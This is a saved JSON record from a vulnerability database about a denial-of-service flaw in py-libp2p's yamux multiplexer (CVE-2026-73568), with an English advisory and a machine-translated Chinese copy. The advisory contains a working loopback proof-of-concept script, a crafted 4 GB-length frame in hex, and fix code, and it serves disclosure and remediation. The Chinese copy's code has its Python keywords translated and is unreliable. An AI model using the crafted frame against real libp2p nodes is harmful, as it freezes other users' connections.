@@ -1,0 +1,173 @@
+{
+  "saved_at": "2026-08-13T19:53:52+00:00",
+  "first_seen": true,
+  "translated": true,
+  "source_list": "https://www.oscs1024.com/oscs/v1/vdb/vuln_info",
+  "source_page": "https://www.oscs1024.com/hd/MPS-bqvp-9x05",
+  "detail": {
+    "analysis_status": 0,
+    "articles": [
+      {
+        "content": "应用程序未能有效地控制资源的使用，导致攻击者可以利用这个漏洞耗尽应用程序所依赖的资源。这些资源可以是计算资源（CPU、内存）、网络带宽、数据库连接或其他系统资源。攻击者可以通过发送特制的请求、恶意输入或其他方式，使应用程序消耗大量资源，导致拒绝服务或系统崩溃。",
+        "title": "什么是拒绝服务"
+      },
+      {
+        "content": "- 消耗计算资源：攻击者可以发送计算密集型的请求，例如复杂的计算、无限循环或递归操作，以耗尽应用程序的计算资源，导致应用程序无法响应其他请求。\r\n- 消耗内存资源：攻击者可以发送大量的数据或恶意输入，以导致应用程序消耗过多的内存资源，从而使系统的可用内存耗尽，并导致应用程序崩溃或变得不可用。\r\n- 消耗网络带宽：攻击者可以发送大量的请求或大型数据包，以消耗应用程序所依赖的网络带宽。这会导致其他合法用户无法正常访问应用程序或降低系统的整体网络性能。\r\n- 消耗存储资源：攻击者可以发送大量的请求或上传大文件，以耗尽应用程序的存储资源，导致系统无法处理其他请求或存储新的数据。",
+        "title": "拒绝服务常见的攻击方式"
+      },
+      {
+        "content": "- 输入验证与过滤：应用程序应该对输入数据进行合理的验证和过滤，防止恶意输入导致资源消耗过高。\r\n- 实施资源限制：应用程序应该实施适当的资源限制策略，例如限制计算操作的时间或次数，限制内存使用量，限制并发连接数等，以防止资源被耗尽。\r\n- 异常处理与错误恢复：应用程序应该具备健壮的异常处理和错误恢复机制，以防止因意外错误导致资源泄漏或无法释放的情况。\r\n- 资源监控与警报：应用程序应该实施适当的资源监控和警报机制，及时发现异常的资源消耗情况，并采取相应的措施来应对。\r\n- 压力测试与性能优化：应用程序应该进行压力测试，以评估其在高负载情况下的性能，并进行必要的性能优化，以确保能够有效地处理大量请求而不耗尽资源。",
+        "title": "如何预防拒绝服务"
+      }
+    ],
+    "cnvd_id": "",
+    "cve_id": "CVE-2026-73568",
+    "cvss": {
+      "cvssv31": [
+        {
+          "source": "security-advisories@github.com",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "severity": "high",
+          "base_score": 7.5
+        }
+      ]
+    },
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "cwe": "CWE-400",
+    "description": "### 总结\npy-libp2p 中的 yamux 流多路复用器在读取帧主体之前不会根据接收窗口验证传入的 DATA 帧长度。任何完成标准 libp2p 握手的对等方都可以发送一个 12 字节帧，声明 4 GB 主体，导致受害者的 yamux 读取循环无限期阻塞。这会影响默认的“new_host()”配置，并且不需要双方进行特殊设置。\n\n### 详细信息\n在“libp2p/stream_muxer/yamux/yamux.py”（第 915 行到 926 行）中，“handle_incoming()”方法按帧类型进行调度。当数据帧到达时，它无条件读取主体：\n\n````蟒蛇\nelif 类型 == TYPE_DATA：\n    尝试：\n        数据 = (\n            等待 read_exactly(self.secured_conn, 长度)\n            如果长度 > 0\n            否则b””\n        ）\n````\n\n“length”字段直接取自有线解码帧头，是一个 32 位无符号整数，最大值为 4,294,967,295。不检查“length”是否适合流的接收窗口（“DEFAULT_WINDOW_SIZE = 256 * 1024”字节）。正文读取也会发生在代码检查引用的“stream_id”是否存在于“self.streams”中之前（该检查位于第 954 行），因此任何流 ID 都会触发该问题。\n\n`handle_incoming()` 本身是一个单一的顺序循环，在主体读取周围没有超时。一旦“read_exactly”暂停等待永远不会到来的数据，循环就无法处理任何后续帧。该 yamux 连接上的每个流都会停止工作，并且不会引发异常。\n\n相同的不受保护的调用出现在第 804 至 806 行的 SYN 分支中，因此具有大长度字段的精心设计的 SYN 帧会触发相同的停顿。\n\nyamux 规范（第 3.3 节）明确要求如果发送方传输的数据多于接收窗口允许的数据，则接收方重置流。 py-libp2p 不会在接收端强制执行此操作。所有三个类似的实现都是这样做的： go-yamux 跟踪每个流的“recvWindow”并在违反时返回“SendWindowExceeded”错误； rust-yamux 根据流信用验证帧长度； js-libp2p yamux 根据“maxMessageSize”检查帧长度。\n\n### 概念验证\n该工具完成两个本地主机之间的正常噪声握手和 yamux 协商，通过攻击前 ping 确认 yamux 运行状况良好，然后将单个恶意帧直接写入攻击者的安全连接。短暂暂停后，它会尝试打开一个新的流，截止时间为 3 秒。打开的流永远不会完成。\n\n文件：test_poc.py\n\n````蟒蛇\n”“”\n作者：@tahaafarooq\nPOC：通过超大数据帧进行 yamux 连接 DoS（连接 DoS）\n”“”\n导入操作系统\n导入秘密\n导入气相色谱\n导入结构体\n\n导入 psutil\n进口三重奏\n导入多地址\n\n从 libp2p 导入 new_host\n从 libp2p.crypto.ed25519 导入 create_new_key_pair\n从 libp2p.custom_types 导入 TProtocol\n从 libp2p.peer.peerinfo 导入 PeerInfo\n从 libp2p.stream_muxer.yamux.yamux 导入 Yamux\n\nLOOPBACK = multiaddr.Multiaddr(\"/ip4/127.0.0.1/tcp/0\")\nPING = TProtocol(\"/audit/ping/1.0.0\")\n\nYAMUX_HEADER_FORMAT = \"!BBHII\"\n类型数据 = 0x0\nHUGE_LENGTH = 0xFFFF_FFFF # 最大 uint32 — 4,294,967,295 字节\n\n\ndef craft_malicious_frame(stream_id: int = 1) -> 字节：\n    ”“”\n    12 字节 yamux 数据帧，标志 = 0，长度 = 4 GB。\n    Stream_id 不相关：yamux 在检查之前读取正文\n    流是否存在。\n    ”“”\n    返回struct.pack（YAMUX_HEADER_FORMAT，0，TYPE_DATA，0，stream_id，HUGE_LENGTH）\n\n\ndef _get_yamux(主机，peer_id) -> Yamux |无：\n    swarm = 主机.get_network()\n    conns = swarm.connections.get(peer_id)\n    如果 conns 为 None：\n        返回无\n    conn = conns[0] if isinstance(conns, 列表) else conns\n    mc = conn.muxed_conn\n    如果 isinstance(mc, Yamux) 返回 mc 否则无\n\n\n异步防御攻击()：\n    proc = psutil.Process(os.getpid())\n    rss0 = proc.memory_info().rss\n\n    v_kp = create_new_key_pair(secrets.token_bytes(32))\n    a_kp = create_new_key_pair(secrets.token_bytes(32))\n\n    # 默认 new_host() — 噪声 + yamux — 没有显式的 sec_opt 或 muxer_opt\n    受害者 = new_host(key_pair=v_kp)\n    攻击者 = new_host(key_pair=a_kp)\n\n    victim.set_stream_handler(PING, lambda s: s.close())与victim.run异步（listen_addrs = [LOOPBACK]）：\n        vaddr = 受害者.get_addrs()[0]\n        在 str(vaddr) 中断言“127.0.0.1”，“安全：非环回”\n        print(f\"[*] 受害者：{vaddr}\")\n        print(f\"[*] 配置：默认（噪声 + yamux）\")\n\n        与 Attacker.run 异步（listen_addrs=[LOOPBACK]）：\n            等待攻击者.connect(PeerInfo(victim.get_id(),victim.get_addrs()))\n            等待 trio.sleep(0.2)\n\n            a_yamux = _get_yamux(攻击者, 受害者.get_id())\n            v_yamux = _get_yamux(受害者, 攻击者.get_id())\n            断言 a_yamux 和 v_yamux，“未找到 yamux muxed_conn”\n            打印（\n                f\"[*] Muxer : 攻击者={type(a_yamux).__name__}, \"\n                f“受害者= {类型（v_yamux）.__name__}”\n            ）\n\n            # --- 预攻击：确认 yamux 健康 ---\n            pre_stream = 等待攻击者.new_stream(victim.get_id(), [PING])\n            等待 pre_stream.close()\n            print(\"[*] 攻击前 ping: OK (yamux live)\")\n\n            # --- 注入恶意框架 ---\n            框架 = craft_malicious_frame(stream_id=1)\n            打印（\n                f\"[*] 注入 {len(frame)} 字节 yamux 帧：\"\n                f“类型=数据标志=0x0stream_id=1长度={HUGE_LENGTH：#010x}”\n                f\"({HUGE_LENGTH:,} 字节)\"\n            ）\n            print(f\"[*] 十六进制帧: {frame.hex()}\")\n\n            # 直接写入噪声加密的安全连接。\n            # secure_conn.write() 在发送前加密；受害者解密并\n            # 查看handle_incoming 处理的原始 yamux 帧字节。\n            等待 a_yamux.secured_conn.write(frame)\n            等待 trio.sleep(0.2)\n            # 受害者的handle_incoming现在已经读取了12字节的标头，并已发送\n            # 到 `eliftyp == TYPE_DATA:`，并输入 read_exactly(conn, 4GB)。\n\n            # --- 攻击后：尝试使用 yamux ---\n            post_attack_succeeded = False\n\n            与 trio.move_on_after(3.0) 一起：\n                尝试：\n                    post_stream = 等待攻击者.new_stream(victim.get_id(), [PING])\n                    等待 post_stream.close()\n                    post_attack_succeeded = True\n                除了异常 e：\n                    print(f\"[*] 攻击后 new_stream 错误: {type(e).__name__}: {e}\")\n\n            GC.collect()\n            rss1 = proc.memory_info().rss\n\n            打印（“\\n===结果===”）\n            print(f\"注入的帧（十六进制）：{frame.hex()}\")\n            打印（\n                f“正文长度字段：请求 {HUGE_LENGTH} 字节，发送 0 字节”\n            ）\n            print(f\"攻击后 ping 正常：{post_attack_succeeded}\")\n            print(f\"RSS 增量：{(rss1 - rss0) / 1024:.1f} KiB\")\n\n            yamux_stuck = 未 post_attack_succeeded\n            print(f\"\\n受害者 yamux 循环卡住：{yamux_stuck}\")\n\n            如果 yamux_stuck：\n                打印（\n                    “[已确认] handle_incoming 被阻止 - 受害者 yamux 因“而死亡”\n                    “这个联系。”\n                ）\n                打印（\n                    “[影响]来自任何经过身份验证的对等方的单个 12 字节写入”\n                    “（噪声握手后）\\n”\n                    \" 永久停止该连接的 yamux。\\n\"\n                    “影响默认 new_host() 配置 - 不需要 mplex。\\n”\n                    “没有超时，没有最大长度检查，没有例外。”\n                ）\n            其他：\n                print(\"[未确认] yamux 在攻击后做出了响应。\")\n\n            断言 yamux_stuck, (\n                “预计 yamux 在注入恶意 DATA 帧后会被卡住，”\n                “但连接仍然有效。”\n            ）\n\n\ndef test_yamux_data_frame_stall():\n    三人组奔跑（攻击）\n\n\n如果 __name__ == \"__main__\":\n    三人组奔跑（攻击）\n````\n\n````\npython3 -m pytest test_poc.py::test_yamux_data_frame_stall -v\n````\n\n恶意帧（12字节，十六进制）：`00000000000000 01ffffffff`\n\n````\n版本=0x00\n类型 = 0x00（数据）\n标志= 0x0000\n流_id = 0x00000001\n长度 = 0xFFFFFFFF（4,294,967,295 字节）\n````\n\n输出：\n\n````\n[*] 配置：默认（噪音 + yamux）[*] 攻击前 ping：好的（yamux live）\n[*] 注入 12 字节 yamux 帧： type=DATA flags=0x0 stream_id=1 length=0xffffffff\n受害者 yamux 循环卡住：True\n[已确认] handle_incoming 被阻止 - 受害者 yamux 因该连接而死亡。\n约 3.8 秒内通过\n````\n\n### 影响\n单个经过身份验证的对等点（已完成噪声握手，无需凭据）可以使用 12 字节的有效负载永久冻结给定连接的 yamux 读取循环。该连接上的所有流都停止工作。不会引发异常，不会写入日志条目，也不会发生自动恢复。\n\n这适用于默认的“new_host()”配置。与 mplex 复用器中的类似问题（需要显式选择加入）不同，使用标准设置的每个 py-libp2p 节点都会受到影响。在 10,000 个连接的默认连接限制下，运行 10,000 个对等点的攻击者可以使用大约 120 KB 的总流量冻结所有连接。\n\n不存在机密性或完整性影响。影响仅限于目标 yamux 连接上的可用性。\n\n### 补救措施\n\n**1.对入站数据帧强制执行接收窗口**（主要修复）\n在调用“read_exactly”之前，拒绝声明长度超过协商接收窗口的帧：\n\n````蟒蛇      \n# libp2p/stream_muxer/yamux/yamux.py\n                                                                                                           \nMAX_YAMUX_FRAME = 256 * 1024 # 匹配 DEFAULT_WINDOW_SIZE 和 go-yamux 默认值\n                                                     \nelif 类型 == TYPE_DATA：\n    如果长度> MAX_YAMUX_FRAME：\n        记录器.警告(\n            f\"yamux: 过大的 DATA 帧长度={length} > {MAX_YAMUX_FRAME}，发送 RST\"\n        ）\n        rst_header = struct.pack（YAMUX_HEADER_FORMAT，0，TYPE_DATA，FLAG_RST，stream_id，0）\n        等待 self.secured_conn.write(rst_header)\n        continue # 跳过正文读取；循环处理下一帧\n    数据 = 等待 read_exactly(self.secured_conn, length) 如果长度 > 0 否则 b\"\"\n````\n\n相同的检查应该应用于第 804 至 806 行的 SYN 分支。\n\n**2.在`handle_incoming()`**中添加每帧超时\n\n````蟒蛇\n而不是 self.event_shutting_down.is_set()：\n    尝试：\n        与 trio.fail_after(60) 一起：\n            标头 = 等待 read_exactly(self.secured_conn, HEADER_SIZE)\n            ...\n    除了 trio.TooSlowError：\n        logger.warning(\"yamux: 帧读取超时，正在关闭连接\")\n        self.event_shutting_down.set()\n        打破\n````\n\n选项 1 完全消除了放大。选项 2 限制了未来可能引入的任何超大读取路径的最坏情况停顿持续时间。",
+    "effects": [
+      {
+        "comp_name": "libp2p",
+        "ecosystem": "pip",
+        "versions": [
+          {
+            "affected_version": "(-∞,0.7.0]",
+            "min_fixed_version": "",
+            "repository": "pip",
+            "solutions": [],
+            "upstream": true
+          }
+        ]
+      }
+    ],
+    "epss": -1,
+    "exp": false,
+    "exploit_requirement": "",
+    "exploit_requirement_cost": "低",
+    "exploitability": "中",
+    "fix_suggestion": "建议修复",
+    "kind": "拒绝服务",
+    "kind_en": "不受控制的资源消耗",
+    "last_modified_time": "2026-08-14",
+    "level": "High",
+    "mps_id": "MPS-bqvp-9x05",
+    "poc": false,
+    "poc_url": [],
+    "published_time": "2026-08-14",
+    "reference_url_list": [
+      {
+        "url": "https://github.com/libp2p/py-libp2p/security/advisories/GHSA-hmj8-5xmh-5573",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/libp2p/py-libp2p/commit/146ea87d1a20cc7dacf684ecf7c204543be04b37",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/advisories/GHSA-hmj8-5xmh-5573",
+        "name": ""
+      }
+    ],
+    "scope_influence": "",
+    "tags": [
+      "python",
+      "开源"
+    ],
+    "title": "libp2p：通过超大数据帧进行 yamux 连接 DoS",
+    "_translated": true
+  },
+  "detail_original": {
+    "analysis_status": 0,
+    "articles": [
+      {
+        "content": "应用程序未能有效地控制资源的使用，导致攻击者可以利用这个漏洞耗尽应用程序所依赖的资源。这些资源可以是计算资源（CPU、内存）、网络带宽、数据库连接或其他系统资源。攻击者可以通过发送特制的请求、恶意输入或其他方式，使应用程序消耗大量资源，导致拒绝服务或系统崩溃。",
+        "title": "什么是拒绝服务"
+      },
+      {
+        "content": "- 消耗计算资源：攻击者可以发送计算密集型的请求，例如复杂的计算、无限循环或递归操作，以耗尽应用程序的计算资源，导致应用程序无法响应其他请求。\r\n- 消耗内存资源：攻击者可以发送大量的数据或恶意输入，以导致应用程序消耗过多的内存资源，从而使系统的可用内存耗尽，并导致应用程序崩溃或变得不可用。\r\n- 消耗网络带宽：攻击者可以发送大量的请求或大型数据包，以消耗应用程序所依赖的网络带宽。这会导致其他合法用户无法正常访问应用程序或降低系统的整体网络性能。\r\n- 消耗存储资源：攻击者可以发送大量的请求或上传大文件，以耗尽应用程序的存储资源，导致系统无法处理其他请求或存储新的数据。",
+        "title": "拒绝服务常见的攻击方式"
+      },
+      {
+        "content": "- 输入验证与过滤：应用程序应该对输入数据进行合理的验证和过滤，防止恶意输入导致资源消耗过高。\r\n- 实施资源限制：应用程序应该实施适当的资源限制策略，例如限制计算操作的时间或次数，限制内存使用量，限制并发连接数等，以防止资源被耗尽。\r\n- 异常处理与错误恢复：应用程序应该具备健壮的异常处理和错误恢复机制，以防止因意外错误导致资源泄漏或无法释放的情况。\r\n- 资源监控与警报：应用程序应该实施适当的资源监控和警报机制，及时发现异常的资源消耗情况，并采取相应的措施来应对。\r\n- 压力测试与性能优化：应用程序应该进行压力测试，以评估其在高负载情况下的性能，并进行必要的性能优化，以确保能够有效地处理大量请求而不耗尽资源。",
+        "title": "如何预防拒绝服务"
+      }
+    ],
+    "cnvd_id": "",
+    "cve_id": "CVE-2026-73568",
+    "cvss": {
+      "cvssv31": [
+        {
+          "source": "security-advisories@github.com",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "severity": "high",
+          "base_score": 7.5
+        }
+      ]
+    },
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "cwe": "CWE-400",
+    "description": "### Summary\nThe yamux stream multiplexer in py-libp2p does not validate incoming DATA frame lengths against the receive window before reading the frame body. Any peer that completes a standard libp2p handshake can send a single 12-byte frame claiming a 4 GB body, causing the victim's yamux read loop to block indefinitely. This affects the default `new_host()` configuration and requires no special setup on either side.\n\n### Details\nIn `libp2p/stream_muxer/yamux/yamux.py` (lines 915 to 926), the `handle_incoming()` method dispatches on frame type. When a DATA frame arrives, it reads the body unconditionally:\n\n```python\nelif typ == TYPE_DATA:\n    try:\n        data = (\n            await read_exactly(self.secured_conn, length)\n            if length > 0\n            else b\"\"\n        )\n```\n\nThe `length` field is taken directly from the wire-decoded frame header, a 32-bit unsigned integer with a maximum value of 4,294,967,295. There is no check that `length` fits within the stream's receive window (`DEFAULT_WINDOW_SIZE = 256 * 1024` bytes). The body read also happens before the code checks whether the referenced `stream_id` even exists in `self.streams` (that check is at line 954), so any stream ID triggers the issue.\n\n`handle_incoming()` itself is a single sequential loop with no timeout around the body read. Once `read_exactly` suspends waiting for data that never comes, the loop cannot process any subsequent frames. Every stream on that yamux connection stops working, and no exception is raised.\n\nThe same unguarded call appears in the SYN branch at lines 804 to 806, so a crafted SYN frame with a large length field triggers the same stall.\n\nThe yamux specification (section 3.3) explicitly requires the receiver to reset the stream if a sender transmits more data than the receive window allows. py-libp2p does not enforce this on the receiver side. All three comparable implementations do: go-yamux tracks `recvWindow` per stream and returns a `SendWindowExceeded` error on violation; rust-yamux validates frame length against the stream credit; js-libp2p yamux checks frame length against `maxMessageSize`.\n\n### PoC\nThe harness completes a normal noise handshake and yamux negotiation between two local hosts, confirms yamux is healthy with a pre-attack ping, then writes a single malicious frame directly to the attacker's secured connection. After a short pause, it attempts to open a new stream with a 3-second deadline. The stream open never completes.\n\nFile: test_poc.py\n\n```python\n\"\"\"\nauthor: @tahaafarooq\nPOC: yamux connection DoS via oversized data frame (connection DoS)\n\"\"\"\nimport os\nimport secrets\nimport gc\nimport struct\n\nimport psutil\nimport trio\nimport multiaddr\n\nfrom libp2p import new_host\nfrom libp2p.crypto.ed25519 import create_new_key_pair\nfrom libp2p.custom_types import TProtocol\nfrom libp2p.peer.peerinfo import PeerInfo\nfrom libp2p.stream_muxer.yamux.yamux import Yamux\n\nLOOPBACK = multiaddr.Multiaddr(\"/ip4/127.0.0.1/tcp/0\")\nPING = TProtocol(\"/audit/ping/1.0.0\")\n\nYAMUX_HEADER_FORMAT = \"!BBHII\"\nTYPE_DATA = 0x0\nHUGE_LENGTH = 0xFFFF_FFFF  # max uint32 — 4,294,967,295 bytes\n\n\ndef craft_malicious_frame(stream_id: int = 1) -> bytes:\n    \"\"\"\n    12-byte yamux DATA frame with flags=0 and length=4 GB.\n    The stream_id is irrelevant: yamux reads the body BEFORE checking\n    whether the stream exists.\n    \"\"\"\n    return struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, 0, stream_id, HUGE_LENGTH)\n\n\ndef _get_yamux(host, peer_id) -> Yamux | None:\n    swarm = host.get_network()\n    conns = swarm.connections.get(peer_id)\n    if conns is None:\n        return None\n    conn = conns[0] if isinstance(conns, list) else conns\n    mc = conn.muxed_conn\n    return mc if isinstance(mc, Yamux) else None\n\n\nasync def attack():\n    proc = psutil.Process(os.getpid())\n    rss0 = proc.memory_info().rss\n\n    v_kp = create_new_key_pair(secrets.token_bytes(32))\n    a_kp = create_new_key_pair(secrets.token_bytes(32))\n\n    # DEFAULT new_host() — noise + yamux — no explicit sec_opt or muxer_opt\n    victim = new_host(key_pair=v_kp)\n    attacker = new_host(key_pair=a_kp)\n\n    victim.set_stream_handler(PING, lambda s: s.close())\n\n    async with victim.run(listen_addrs=[LOOPBACK]):\n        vaddr = victim.get_addrs()[0]\n        assert \"127.0.0.1\" in str(vaddr), \"SAFETY: non-loopback\"\n        print(f\"[*] Victim   : {vaddr}\")\n        print(f\"[*] Config   : DEFAULT (noise + yamux)\")\n\n        async with attacker.run(listen_addrs=[LOOPBACK]):\n            await attacker.connect(PeerInfo(victim.get_id(), victim.get_addrs()))\n            await trio.sleep(0.2)\n\n            a_yamux = _get_yamux(attacker, victim.get_id())\n            v_yamux = _get_yamux(victim, attacker.get_id())\n            assert a_yamux and v_yamux, \"yamux muxed_conn not found\"\n            print(\n                f\"[*] Muxer    : attacker={type(a_yamux).__name__}, \"\n                f\"victim={type(v_yamux).__name__}\"\n            )\n\n            # --- Pre-attack: confirm yamux is healthy ---\n            pre_stream = await attacker.new_stream(victim.get_id(), [PING])\n            await pre_stream.close()\n            print(\"[*] Pre-attack ping: OK (yamux live)\")\n\n            # --- Inject malicious frame ---\n            frame = craft_malicious_frame(stream_id=1)\n            print(\n                f\"[*] Injecting {len(frame)}-byte yamux frame: \"\n                f\"type=DATA flags=0x0 stream_id=1 length={HUGE_LENGTH:#010x} \"\n                f\"({HUGE_LENGTH:,} bytes)\"\n            )\n            print(f\"[*] Frame hex: {frame.hex()}\")\n\n            # Write directly to the noise-encrypted secure conn.\n            # secured_conn.write() encrypts before sending; victim decrypts and\n            # sees the raw yamux frame bytes, which handle_incoming processes.\n            await a_yamux.secured_conn.write(frame)\n            await trio.sleep(0.2)\n            # Victim's handle_incoming has now read the 12-byte header, dispatched\n            # to `elif typ == TYPE_DATA:`, and entered read_exactly(conn, 4GB).\n\n            # --- Post-attack: try to use yamux ---\n            post_attack_succeeded = False\n\n            with trio.move_on_after(3.0):\n                try:\n                    post_stream = await attacker.new_stream(victim.get_id(), [PING])\n                    await post_stream.close()\n                    post_attack_succeeded = True\n                except Exception as e:\n                    print(f\"[*] Post-attack new_stream error: {type(e).__name__}: {e}\")\n\n            gc.collect()\n            rss1 = proc.memory_info().rss\n\n            print(\"\\n=== RESULTS ===\")\n            print(f\"Injected frame (hex) : {frame.hex()}\")\n            print(\n                f\"Body-length field    : {HUGE_LENGTH} bytes requested, 0 bytes sent\"\n            )\n            print(f\"Post-attack ping OK  : {post_attack_succeeded}\")\n            print(f\"RSS delta            : {(rss1 - rss0) / 1024:.1f} KiB\")\n\n            yamux_stuck = not post_attack_succeeded\n            print(f\"\\nVictim yamux loop stuck: {yamux_stuck}\")\n\n            if yamux_stuck:\n                print(\n                    \"[CONFIRMED] handle_incoming blocked - victim yamux dead for \"\n                    \"this connection.\"\n                )\n                print(\n                    \"[IMPACT   ] Single 12-byte write from any authenticated peer \"\n                    \"(post-noise-handshake)\\n\"\n                    \"            permanently stalls yamux for that connection.\\n\"\n                    \"            Affects DEFAULT new_host() config - no mplex required.\\n\"\n                    \"            No timeout, no max-length check, no exception.\"\n                )\n            else:\n                print(\"[NOT CONFIRMED] yamux responded post-attack.\")\n\n            assert yamux_stuck, (\n                \"Expected yamux to be stuck after injecting malicious DATA frame, \"\n                \"but connection remained functional.\"\n            )\n\n\ndef test_yamux_data_frame_stall():\n    trio.run(attack)\n\n\nif __name__ == \"__main__\":\n    trio.run(attack)\n```\n\n```\npython3 -m pytest test_poc.py::test_yamux_data_frame_stall -v\n```\n\nMalicious frame (12 bytes, hex): `00000000000000 01ffffffff`\n\n```\nversion  = 0x00\ntype     = 0x00  (DATA)\nflags    = 0x0000\nstream_id= 0x00000001\nlength   = 0xFFFFFFFF  (4,294,967,295 bytes)\n```\n\nOutput:\n\n```\n[*] Config   : DEFAULT (noise + yamux)\n[*] Pre-attack ping: OK (yamux live)\n[*] Injecting 12-byte yamux frame: type=DATA flags=0x0 stream_id=1 length=0xffffffff\nVictim yamux loop stuck: True\n[CONFIRMED] handle_incoming blocked - victim yamux dead for this connection.\nPASSED in ~3.8s\n```\n\n### Impact\nA single authenticated peer (one that has completed the noise handshake, which requires no credentials) can permanently freeze the yamux read loop for a given connection using 12 bytes of payload. All streams on that connection stop working. No exception is raised, no log entry is written, and no automatic recovery occurs.\n\nThis applies to the default `new_host()` configuration. Unlike a similar issue in the mplex muxer (which requires an explicit opt-in), every py-libp2p node using the standard setup is affected. At the default connection limit of 10,000 connections, an attacker running 10,000 peers can freeze all connections using roughly 120 KB of total traffic.\n\nThere is no confidentiality or integrity impact. The effect is limited to availability on the targeted yamux connection.\n\n### Remediation\n\n**1. Enforce the receive window on inbound DATA frames** (primary fix)\nBefore calling `read_exactly`, reject frames whose declared length exceeds the negotiated receive window:\n\n```python      \n# libp2p/stream_muxer/yamux/yamux.py\n                                                                                                           \nMAX_YAMUX_FRAME = 256 * 1024  # matches DEFAULT_WINDOW_SIZE and go-yamux default\n                                                     \nelif typ == TYPE_DATA:\n    if length > MAX_YAMUX_FRAME:\n        logger.warning(\n            f\"yamux: oversized DATA frame length={length} > {MAX_YAMUX_FRAME}, sending RST\"\n        )\n        rst_header = struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, FLAG_RST, stream_id, 0)\n        await self.secured_conn.write(rst_header)\n        continue  # skip body read; loop processes next frame\n    data = await read_exactly(self.secured_conn, length) if length > 0 else b\"\"\n```\n\nThe same check should be applied to the SYN branch at lines 804 to 806.\n\n**2. Add a per-frame timeout in `handle_incoming()`**\n\n```python\nwhile not self.event_shutting_down.is_set():\n    try:\n        with trio.fail_after(60):\n            header = await read_exactly(self.secured_conn, HEADER_SIZE)\n            ...\n    except trio.TooSlowError:\n        logger.warning(\"yamux: frame read timed out, closing connection\")\n        self.event_shutting_down.set()\n        break\n```\n\nOption 1 eliminates the amplification entirely. Option 2 bounds the worst-case stall duration for any future oversized-read path that might be introduced.",
+    "effects": [
+      {
+        "comp_name": "libp2p",
+        "ecosystem": "pip",
+        "versions": [
+          {
+            "affected_version": "(-∞,0.7.0]",
+            "min_fixed_version": "",
+            "repository": "pip",
+            "solutions": [],
+            "upstream": true
+          }
+        ]
+      }
+    ],
+    "epss": -1,
+    "exp": false,
+    "exploit_requirement": "",
+    "exploit_requirement_cost": "低",
+    "exploitability": "中",
+    "fix_suggestion": "Recommend",
+    "kind": "拒绝服务",
+    "kind_en": "Uncontrolled Resource Consumption",
+    "last_modified_time": "2026-08-14",
+    "level": "High",
+    "mps_id": "MPS-bqvp-9x05",
+    "poc": false,
+    "poc_url": [],
+    "published_time": "2026-08-14",
+    "reference_url_list": [
+      {
+        "url": "https://github.com/libp2p/py-libp2p/security/advisories/GHSA-hmj8-5xmh-5573",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/libp2p/py-libp2p/commit/146ea87d1a20cc7dacf684ecf7c204543be04b37",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/advisories/GHSA-hmj8-5xmh-5573",
+        "name": ""
+      }
+    ],
+    "scope_influence": "",
+    "tags": [
+      "python",
+      "开源"
+    ],
+    "title": "libp2p: yamux connection DoS via oversized data frame"
+  },
+  "first_saved_at": "2026-08-13T19:53:52+00:00"
+}
